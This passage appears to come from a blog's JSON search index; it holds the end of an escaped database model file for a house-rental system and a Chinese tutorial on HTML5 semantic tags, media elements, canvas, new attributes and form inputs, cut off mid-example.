Ref=&quot;o23&quot;/&gt;&lt;/c:ParentTable&gt;&lt;c:ChildTable&gt;&lt;o:Table Ref=&quot;o22&quot;/&gt;&lt;/c:ChildTable&gt;&lt;c:ParentKey&gt;&lt;o:Key Ref=&quot;o56&quot;/&gt;&lt;/c:ParentKey&gt;&lt;c:Joins&gt;&lt;o:ReferenceJoin Id=&quot;o100&quot;&gt;&lt;a:ObjectID&gt;EA371BD2-34B3-4F22-AD1A-E34A2340EDD1&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;645DE716-F528-4B05-9E29-99369F0BD595&#125;DAT 1618333034&lt;/a:History&gt;&lt;c:Object1&gt;&lt;o:Column Ref=&quot;o53&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Column Ref=&quot;o43&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:ReferenceJoin&gt;&lt;/c:Joins&gt;&lt;/o:Reference&gt;&lt;o:Reference Id=&quot;o18&quot;&gt;&lt;a:ObjectID&gt;DB14BADD-AA19-4F31-8C08-1A843614E9DC&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定&lt;/a:Name&gt;&lt;a:Code&gt;ReserveTwo&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333889&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;7B0D4B67-1C5D-4546-B012-F8C57E32D803&#125;DAT 1618333034ORG &#123;D4FD4412-8743-4AEA-B773-42465813A721&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:Cardinality&gt;0..*&lt;/a:Cardinality&gt;&lt;a:UpdateConstraint&gt;1&lt;/a:UpdateConstraint&gt;&lt;a:DeleteConstraint&gt;1&lt;/a:DeleteConstraint&gt;&lt;c:ParentTable&gt;&lt;o:Table Ref=&quot;o21&quot;/&gt;&lt;/c:ParentTable&gt;&lt;c:ChildTable&gt;&lt;o:Table Ref=&quot;o25&quot;/&gt;&lt;/c:ChildTable&gt;&lt;c:ParentKey&gt;&lt;o:Key Ref=&quot;o39&quot;/&gt;&lt;/c:ParentKey&gt;&lt;c:Joins&gt;&lt;o:ReferenceJoin Id=&quot;o101&quot;&gt;&lt;a:ObjectID&gt;17345672-D305-4FC2-B234-4C39EFE172D7&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;80C6C77E-2606-4686-8AE7-9422A808A802&#125;DAT 1618333034&lt;/a:History&gt;&lt;c:Object1&gt;&lt;o:Column Ref=&quot;o36&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Column Ref=&quot;o72&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:ReferenceJoin&gt;&lt;/c:Joins&gt;&lt;/o:Reference&gt;&lt;o:Reference Id=&quot;o20&quot;&gt;&lt;a:ObjectID&gt;D289E8B2-2004-4B00-BFB1-190928DAB502&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定&lt;/a:Name&gt;&lt;a:Code&gt;Reserveone&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333869&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;D6DA5B71-06A1-4A4F-97C4-7A81725CC0E5&#125;DAT 1618333034ORG &#123;D4FD4412-8743-4AEA-B773-42465813A721&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:Cardinality&gt;0..*&lt;/a:Cardinality&gt;&lt;a:UpdateConstraint&gt;1&lt;/a:UpdateConstraint&gt;&lt;a:DeleteConstraint&gt;1&lt;/a:DeleteConstraint&gt;&lt;c:ParentTable&gt;&lt;o:Table Ref=&quot;o22&quot;/&gt;&lt;/c:ParentTable&gt;&lt;c:ChildTable&gt;&lt;o:Table Ref=&quot;o25&quot;/&gt;&lt;/c:ChildTable&gt;&lt;c:ParentKey&gt;&lt;o:Key Ref=&quot;o48&quot;/&gt;&lt;/c:ParentKey&gt;&lt;c:Joins&gt;&lt;o:ReferenceJoin Id=&quot;o102&quot;&gt;&lt;a:ObjectID&gt;A485540D-C986-49DB-A293-97FB61571060&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;3C7BE695-A5F1-488B-8AA8-351DDA6A431C&#125;DAT 1618333034&lt;/a:History&gt;&lt;c:Object1&gt;&lt;o:Column Ref=&quot;o42&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Column Ref=&quot;o103&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:ReferenceJoin&gt;&lt;/c:Joins&gt;&lt;/o:Reference&gt;&lt;o:Reference Id=&quot;o30&quot;&gt;&lt;a:ObjectID&gt;62FE67C5-5750-4917-9CB8-33D9AD73C956&lt;/a:ObjectID&gt;&lt;a:Name&gt;接听&lt;/a:Name&gt;&lt;a:Code&gt;answer&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333772&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;454931F7-376E-4BF7-93DB-EE4BCF290BEA&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:Cardinality&gt;0..*&lt;/a:Cardinality&gt;&lt;a:UpdateConstraint&gt;1&lt;/a:UpdateConstraint&gt;&lt;a:DeleteConstraint&gt;1&lt;/a:DeleteConstraint&gt;&lt;c:ParentTable&gt;&lt;o:Table Ref=&quot;o34&quot;/&gt;&lt;/c:ParentTable&gt;&lt;c:ChildTable&gt;&lt;o:Table Ref=&quot;o35&quot;/&gt;&lt;/c:ChildTable&gt;&lt;c:ParentKey&gt;&lt;o:Key Ref=&quot;o85&quot;/&gt;&lt;/c:ParentKey&gt;&lt;c:Joins&gt;&lt;o:ReferenceJoin Id=&quot;o104&quot;&gt;&lt;a:ObjectID&gt;D568D71D-559D-4DAE-80C7-4427A96D1E6B&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;14EB9E04-93D0-4A37-99B4-4D26D18A0179&#125;DAT 1618333034&lt;/a:History&gt;&lt;c:Object1&gt;&lt;o:Column Ref=&quot;o80&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Column Ref=&quot;o89&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:ReferenceJoin&gt;&lt;/c:Joins&gt;&lt;/o:Reference&gt;&lt;o:Reference Id=&quot;o33&quot;&gt;&lt;a:ObjectID&gt;473521EA-44D9-4D41-A403-657ED8DAB618&lt;/a:ObjectID&gt;&lt;a:Name&gt;联系&lt;/a:Name&gt;&lt;a:Code&gt;contact&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333754&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;7F2F2D1E-3184-4F02-AA2D-E0DD2929B1E8&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:Cardinality&gt;0..*&lt;/a:Cardinality&gt;&lt;a:UpdateConstraint&gt;1&lt;/a:UpdateConstraint&gt;&lt;a:DeleteConstraint&gt;1&lt;/a:DeleteConstraint&gt;&lt;c:ParentTable&gt;&lt;o:Table Ref=&quot;o21&quot;/&gt;&lt;/c:ParentTable&gt;&lt;c:ChildTable&gt;&lt;o:Table Ref=&quot;o35&quot;/&gt;&lt;/c:ChildTable&gt;&lt;c:ParentKey&gt;&lt;o:Key Ref=&quot;o39&quot;/&gt;&lt;/c:ParentKey&gt;&lt;c:Joins&gt;&lt;o:ReferenceJoin Id=&quot;o105&quot;&gt;&lt;a:ObjectID&gt;804B28B0-D236-452A-8499-78238BC11F81&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;F421BDFA-354B-45A8-A4B9-57027FE597C0&#125;DAT 1618333034&lt;/a:History&gt;&lt;c:Object1&gt;&lt;o:Column Ref=&quot;o36&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Column Ref=&quot;o90&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:ReferenceJoin&gt;&lt;/c:Joins&gt;&lt;/o:Reference&gt;&lt;/c:References&gt;&lt;c:DefaultGroups&gt;&lt;o:Group Id=&quot;o106&quot;&gt;&lt;a:ObjectID&gt;57240AAC-5F84-411D-8450-E49301D5190E&lt;/a:ObjectID&gt;&lt;a:Name&gt;PUBLIC&lt;/a:Name&gt;&lt;a:Code&gt;PUBLIC&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618332889&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332889&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;/o:Group&gt;&lt;/c:DefaultGroups&gt;&lt;c:TargetModels&gt;&lt;o:TargetModel Id=&quot;o107&quot;&gt;&lt;a:ObjectID&gt;FE209E30-5846-4AB3-ACC0-9A6CFE841500&lt;/a:ObjectID&gt;&lt;a:Name&gt;PostgreSQL 9.x&lt;/a:Name&gt;&lt;a:Code&gt;PGSQL9&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618332891&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1341906213&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:TargetModelURL&gt;file:///%[XDB]%/pgsql9.xdb&lt;/a:TargetModelURL&gt;&lt;a:TargetModelID&gt;83063C86-4E0A-4954-BF00-620C0D0F02D8&lt;/a:TargetModelID&gt;&lt;a:TargetModelClassID&gt;4BA9F647-DAB1-11D1-9944-006097355D9B&lt;/a:TargetModelClassID&gt;&lt;a:TargetModelLastModificationDate&gt;1341906213&lt;/a:TargetModelLastModificationDate&gt;&lt;c:SessionShortcuts&gt;&lt;o:Shortcut Ref=&quot;o4&quot;/&gt;&lt;/c:SessionShortcuts&gt;&lt;/o:TargetModel&gt;&lt;o:TargetModel Id=&quot;o108&quot;&gt;&lt;a:ObjectID&gt;64FF08B7-7461-4C4C-B873-1C81C156384E&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租赁系统&lt;/a:Name&gt;&lt;a:Code&gt;房屋租赁系统&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:TargetModelURL&gt;file:///%_EXAMPLES%/我的项目/房屋租赁系统.ldm&lt;/a:TargetModelURL&gt;&lt;a:TargetModelID&gt;E0CA7255-710D-4C0F-8906-045A9AB7CB75&lt;/a:TargetModelID&gt;&lt;a:TargetModelClassID&gt;5F45F978-C4F3-4E35-A3FC-AF3318663A0F&lt;/a:TargetModelClassID&gt;&lt;a:TargetModelLastModificationDate&gt;1618333034&lt;/a:TargetModelLastModificationDate&gt;&lt;c:SessionShortcuts&gt;&lt;o:Shortcut Ref=&quot;o3&quot;/&gt;&lt;/c:SessionShortcuts&gt;&lt;/o:TargetModel&gt;&lt;/c:TargetModels&gt;&lt;/o:Model&gt;&lt;/c:Children&gt;&lt;/o:RootObject&gt;&lt;/Model&gt;","categories":[],"tags":[{"name":"答案","slug":"答案","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E7%AD%94%E6%A1%88/"}]},{"title":"HTML5新特性","slug":"前端学习9","date":"2021-04-07T13:11:06.000Z","updated":"2021-05-28T09:19:25.753Z","comments":true,"path":"2021/04/07/前端学习9/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/04/07/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A09/","excerpt":"","text":"HTML5新特性课程提要 HTML5介绍 HTML5网页标准结构 HTML5多媒体标签 HTML5新增常用属性 HTML5新表单操作 HTML5代码规范 6.1 HTML5介绍HTML5成为HTML、XHTML以及HTML DOM的新标准。 HTML5是W3C和WHATWG合作研发的结果，于2014年正式发布。 HTML5成为了新一代网页开发的标准。 HTML5主要新功能： 音频视频播放：视频已经在Web上广泛流行，但是其格式几乎都是专有的。YouTube使用Flash，Microsoft使用Windows Media，Apple使用QuickTime。所以在一种浏览器中用来嵌入这些内容的标记在另一种浏览器中是无效的。而HTML5新增的 &lt;audio&gt;和 &lt;video&gt;标签使得浏览器不需要插件既可播放视频、音频，抛弃了flash。 动画canvas：HTML5引进了很多新的特性，其中最令人期待的之一就是canvas元素。HTML5 canvas提供了Javascript绘制图形的方法，此方法使用简单但功能强大。每一个canvas元素都有一个“上下文（context）”（想象成绘画板上的一页），在其中可以绘制任意的图形。浏览器支持多个canvas上下文，并通过不同的API提供图形绘制功能。绘画，制作动画（如小游戏开发等） 地理信息：HTML5的另一个功能是地理信息定位功能，一些浏览器提供了geolocation API，这个API也由W3C管理，可以结合HTML5实现你当前地理位置的定位。Google Maps在使用该功能，在Google地图上，你可以通过相关操作告诉Google地图你的当前地理位置信息。目前，geolocation API并没有被众多桌面浏览器广泛但采用（只有Chrome和FireFox 3.6+采用了），但Google Gears插件可以帮助那些旧浏览器实现该功能。例如，Twitter借此实现地理信息感知的tweets消息，当浏览器支持geolocation API的时候，会自动使用该API，否则，使用Google Gears。 硬件加速：Web开发人员只需要使用HTML5标记就可以利用硬件加速优势以及可以通过多种设备数据的强大云环境。针对网站，使用像SVG这样的技术来优化包括台式机和笔记本电脑等尺寸较大的电脑，以及智能手机和平板电脑等更多便携设备上的体验。 WebSocket：是HTML5开始有提供的一种在单个TCP连接上进行全双工通讯的协议。在WebSocket API中，浏览器和服务器只需要做一个握手的动作，然后，浏览器和服务器之间就形成了一条快速通道。两者之间就可以数据相互传送。浏览器通过Javascript向服务器发出建立WebSocket连接请求，连接建立以后，客户端和服务器端就可以通过TCP连接直接交换数据。当你获取WebSocket连接后，你可以通过send()方法来向服务器发送数据，并通过onmessage事件来接收服务器返回的数据。创建WebSocket对象： 1var Socket = new WebSocket(url, [portocol]); 本地离线应用程序：新增了一个API，利用本地缓存机制，为离线的Web应用程序开发提供了可能。为了能够让Web应用程序在离线状态的时候也能正常工作，必须把所有构成Web应用程序的资源文件，诸如HTML文件，CSS文件，Javascript脚本文件放在本地缓存中，当服务器没有和网络连接时，也可以利用本地缓存中的资源文件来正常运行Web应用程序。 本地存储：相对于HTML4只能使用cookie在客户端存储数据，大小受限制，占用带宽，操作复杂的情况。HTML5支持使用Web Storage在客户端进行存储数据，容量更大，减轻带宽压力，操作简便。 语义化标记：HTML5最大的意义在于改变了WEB文档的结构方式，借助header、footer、section、article这些标签，我们可以实现更具结构化、语义化的文档。这样，搜索引擎可以更容易索引Web站点，我们也可以搜索更快、获得更准确的信息。 HTML5与Flash：HTML5免费、但是不能做特效。 HTML5的优势： 提高可用性和改进用户的友好体验 新标签有助于开发人员定义重要的内容 可以给站点带来更多的多媒体元素（视频和音频） 可以很好的代替FLASH和Silverlight 当涉及到网站的抓取和索引时，对于SEO很友好 大量应用于移动程序和游戏 HTML5的劣势： HTML5本身还在发展中，它不是用户应用的最迫切需求，更多是厂商视图改变软件生态格局的战略需求 HTML5的兼容性受限于各大浏览器表现，例如微软的IE和firefox之间存在很多差别 HTML5需要一个成熟完整的开发环境，目前还缺少 HTML5功能的暴增，浏览器必须有一个高效的图形引擎和脚本引擎 HTML5需要杀手级应用来吸引和引导用户升级浏览器，最终完成HTML5终端的部署（通过HTML升级带动浏览器升级） 6.2 HTML5网页标准结构6.2.1 网页布局标签 header：页首 nav：导航栏 aside：侧边栏 main：主体 section：区块 article：文章 footer：页尾 6.2.2 语义化标签 &lt;mark&gt;：高亮显示，行级标签 &lt;summary&gt;（摘要）和 &lt;details&gt;（描述） ：一般用于名词解释，或用于封装一个区块。大前端开发》组件化开发+模块化开发+自动化开发+后台开发 &lt;meter&gt;：定义度量衡。有属性value/min/max/low/high &lt;progress&gt;：显示进度条。有属性value/min/max &lt;dialog&gt;：对话框或窗口 &lt;figure&gt;：figure标签用于对元素进行组合，一般用来组合一张图的标题、图片和图片描述等 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;语义化标签&lt;/title&gt; &lt;style&gt; dialog&#123; position: relative; &#125; dialog span&#123; position: absolute; right: 5px; top: 5px; cursor: pointer;/*添加手形*/ &#125; figure&#123; width: 10px; height: 100px; text-align: center; &#125; figure&#123; width: 100%; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;!--mark标签：高亮显示--&gt; &lt;p&gt;&lt;mark&gt;核心价值观&lt;/mark&gt;是一个民族赖以维系的精神纽带，是一个国家共同的思想道德基础。能否构建具有强大感召力的核心价值观，关系社会和谐稳定，关系国家长治久安。&lt;/p&gt;&lt;!--`&lt;summary&gt;（摘要）`和 `&lt;details&gt;（描述）` ：一般用于名词解释--&gt; &lt;details&gt; &lt;summary&gt; 内容 &lt;/summary&gt; &lt;h2&gt;社会主义核心价值观&lt;/h2&gt; &lt; &lt;/details&gt;&lt;!--meter--&gt;&lt;meter value=&quot;110&quot; min=&quot;80&quot; max=&quot;120&quot; &gt;&lt;/meter&gt;公里/h&lt;!--progress:进度条--&gt;&lt;p&gt;任务已完成：&lt;/p&gt;&lt;progress value=&quot;80&quot; max=&quot;100&quot;&gt;&lt;/progress&gt;80%&lt;!--`&lt;dialog&gt;`：对话框或窗口--&gt;&lt;dialog open&gt; &lt;span&gt;&amp;times;&lt;/span&gt; &lt;h2&gt;社会主义核心价值观&lt;/h2&gt; &lt;ul&gt; &lt;li&gt;富强&lt;/li&gt; &lt;li&gt;民主&lt;/li&gt; &lt;li&gt;文明&lt;/li&gt; &lt;li&gt;和谐&lt;/li&gt; &lt;li&gt;自由&lt;/li&gt; &lt;li&gt;平等&lt;/li&gt; &lt;li&gt;公正&lt;/li&gt; &lt;li&gt;法治&lt;/li&gt; &lt;li&gt;爱国&lt;/li&gt; &lt;li&gt;敬业&lt;/li&gt; &lt;li&gt;诚信&lt;/li&gt; &lt;li&gt;友善&lt;/li&gt; &lt;/ul&gt;&lt;/dialog&gt;&lt;!--`&lt;figure&gt;`：figure标签用于对元素进行组合--&gt;&lt;figure&gt; &lt;h4&gt;游戏&lt;/h4&gt; &lt;img src=&quot;imgs/三国杀.bmp&quot; alt=&quot;测试&quot;/&gt; &lt;p&gt;三国杀，谋略智慧游戏&lt;/p&gt;&lt;/figure&gt;&lt;/body&gt;&lt;/html&gt; 6.3 HTML5多媒体 &lt;audio&gt;：播放音乐或音频。IE9以下的版本不支持。 支持的格式：.mp3/.ogg/.wavOgg：一种新的音频压缩格式，是完全免费、开放和没有专利限制的MP3：一种音频压缩技术。它被设计用来大幅度降低音频数据量WAV：为微软公司开发的一种声音文件格式，声音文件质量和CD相差无几 属性：src：加载文件路径autoplay：自动播放loop：循环controls：控制条muted：静音preload：预加载（当使用autoplay时，preload自动失效） &lt;video&gt;：加载视频 支持的格式.mp4/.ogg/.webmmp4：带有H.264视频编码和ACC音频编码的MPEG4文件WEBM：带有VP8视频解码和Vorbis音频编码的WebM文件Ogg：带有Theora视频编码和Vorbis音频编码的Ogg文件 属性 src：加载文件路径autoplay：自动播放loop：循环，默认无限循环controls：控制条muted：静音preload：预加载（当使用autoplay时，preload自动失效）width/height：设置视频宽高poster：海报 &lt;embed&gt;：加载插件，嵌入内容。(不常用) 属性src：加载文件路径width：宽度height：高度type：类型loophiddenautostartstarttimecontrols &lt;canvas&gt;：画布，是一个容器元素， 注意：单独使用canvas毫无意义，它必须结合JavaScript使用。它的具体功能体现是通过javascript脚本体现的。canvas的宽高最好不要通过css实现，而是直接使用标签属性width和height实现。 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;音频&lt;/title&gt; &lt;style&gt; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;!--音频--&gt;&lt;audio src=&quot;C:\\Users\\LEGION\\Downloads\\小时姑娘 - 爱殇.mp3&quot; controls autoplay loop=&quot;2&quot; muted preload=&quot;auto&quot;&gt;&lt;/audio&gt;&lt;!--视频--&gt;&lt;video src=&quot;F:\\开发学习资料\\英语六级\\03.20年12月有道六级\\02.基础班\\听力基础包\\六级真题核心句1.mp4&quot; width=&quot;400pxhg&quot; autoplay controls poster=&quot;imgs/三国杀.bmp&quot;&gt;&lt;/video&gt;&lt;!--embed：加载插件，嵌入内容--&gt;&lt;embed src=&quot;run.swf&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;embed src=&quot;movie.ogg&quot; type=&quot;video/ogg&quot; autostart=&quot;true&quot;&gt;&lt;!--canvas--&gt;&lt;canvas width=&quot;400&quot; height=&quot;200&quot; style=&quot;background-color: cyan&quot;&gt;&lt;/canvas&gt;&lt;/body&gt;&lt;script&gt;/*script用来包裹脚本代码*/ var canvas = document.getElementsByTagName(&#x27;canvas&#x27;)[0];//脚本DOM操作，用来获取canvas这个标签元素 var ctx = canvas.getContext(&#x27;2d&#x27;)//绘制2d图 ctx.fillStyle = &#x27;#ff0000&#x27;//设置填充色 ctx.fillRect(50,0,200,100)//绘制一个矩形&lt;/script&gt;&lt;/html&gt; 6.4 HTML5新增常用属性 contenteditable：属性只能是true或者false，几乎可以为任何元素指定。用于将元素设为可编辑模式，可用于所有标签。 hidden：属性规定对元素进行隐藏，一般用来传值，或者当某个条件成立，执行内容显示，属性默认值为hidden。 data-*：属性用于存储页面或应用程序的私有自定义数据。一般用于传值。 multiple：规定输入域可选择多个内容。用于表单组件中，如file/select。 required：属性约束表单元在提交前必须输入值。用于表单组件中，需要结合提交按钮使用。 pattern：属性规定用于验证输入字段模式。 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;HTML5新增属性&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--contenteditable--&gt; &lt;p contenteditable=&quot;true&quot;&gt;contextEditable&lt;/p&gt; &lt;!--hidden--&gt; &lt;div class=&quot;box&quot;&gt;box1&lt;/div&gt; &lt;div class=&quot;box&quot; hidden&gt;box2&lt;/div&gt; &lt;div class=&quot;box&quot;&gt;box3&lt;/div&gt; &lt;!--data-*：属性用于存储页面或应用程序的私有自定义数据。一般用于传值--&gt; &lt;p data-id=&quot;0001&quot;&gt;只是撒&lt;/p&gt; &lt;!--multiple：规定输入域可选择多个内容。用于**表单组件**中，如file/select。--&gt; &lt;!--按住ctrl实现多选--&gt; &lt;select name=&quot;&quot; id=&quot;&quot; multiple&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt; &lt;/select&gt; &lt;!--required：属性约束表单元在提交前必须输入值。--&gt; &lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;text&quot; placeholder=&quot;请输入用户名：&quot; required&gt;&lt;br/&gt;&lt;!--为正则写法--&gt; &lt;input type=&quot;email&quot; placeholder=&quot;请输入邮箱：&quot;&gt;&lt;br/&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;!--pattern：属性规定用于验证输入字段模式。--&gt; &lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;text&quot; placeholder=&quot;请输入用户名：&quot; required pattern=&quot;[A-Za-z0-9] &#123;4,6&#125;&quot;&gt;&lt;br/&gt;&lt;!--为正则写法--&gt; &lt;input type=&quot;email&quot; placeholder=&quot;请输入邮箱：&quot;&gt;&lt;br/&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 6.5 HTML5新表单操作6.5.1 表单组件 color：颜色 email：邮箱，自带邮件格式验证 url：网址，自带格式验证 tel：电话号码 number：数字，自带格式验证有属性min/max/step range：范围 search：搜索 date：日期 datetime：日期时间 datetime-local：本地日期时间 year：年份 time：时间 month：月份 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;HTML5新表单操作&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--* color：颜色--&gt;&lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;color&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;!--* email：邮箱--&gt;&lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;email&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;!--* url：网址--&gt;&lt;!--* tel：电话号码--&gt;&lt;!--* number：数字--&gt;&lt;!--* range：范围--&gt;&lt;!--* search：搜索--&gt;&lt;!--* date：日期--&gt;&lt;!--* date：日期--&gt;&lt;!--* datetime：日期时间--&gt;&lt;!--* datetime-local：本地日期时间--&gt;&lt;!--* year：年份--&gt;&lt;!--* time：时间--&gt;&lt;!--* month：月份--&gt;&lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;tel&quot;&gt;&lt;br&gt; &lt;input type=&quot;url&quot;&gt;&lt;br&gt; &lt;input type=&quot;number&quot; step=&quot;10&quot; min=&quot;100&quot; max=&quot;200&quot;&gt;&lt;br&gt; &lt;input type=&quot;range&quot; class=&quot;type&quot; value=&quot;20&quot;&gt;&lt;br&gt; &lt;input type=&quot;search&quot;&gt;&lt;br&gt; &lt;input type=&quot;date&quot;&gt;&lt;br&gt; &lt;input type=&quot;datetime&quot;&gt;&lt;br&gt; &lt;input type=&quot;datetime-local&quot;&gt;&lt;br&gt; &lt;input type=&quot;week&quot;&gt;&lt;br&gt; &lt;input type=&quot;time&quot;&gt;&lt;br&gt; &lt;input type=&quot;month&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 6.5.2 form属性 formaction：属性，表单请求地址，更改表单的action属性值（数据提交位置） formenctype：修改表单请求类型 formmethod：修改数据提交方法 get方式：以字节为单位提交（只接受ASCII）；以明文提交；提交信息会显示在地址栏中；在浏览器中回退是无害的；get会被浏览器主动缓存；get和post在传输字节上一般都没有限制，但不排除个别浏览器，可以理解为，get一般不超过2K，post一般不超过2M；get一般不用于传输一些敏感数据，因为传输的数据是裸露的。 post方式：以字符为单位提交；以暗文方式提交；在浏览器中回退，post会再次提交请求；post不会被被浏览器主动缓存，除非手动设置。 默认以get方式发请求或者提交 form：设置表单元素属于哪个表单 novalidate：不验证 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;form表单属性&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--* formaction：属性，表单请求地址，更改表单的action属性值（数据提交位置）--&gt;&lt;form action=&quot;//baidu.com&quot;&gt; &lt;input type=&quot;submit&quot; formaction=&quot;//163.com&quot;&gt;&lt;/form&gt;&lt;!--* formenctype：修改表单请求类型--&gt;&lt;form action=&quot;#&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;&lt;!--application/x-www-form-urlencoded：普通表单类型--&gt; &lt;input type=&quot;submit&quot; 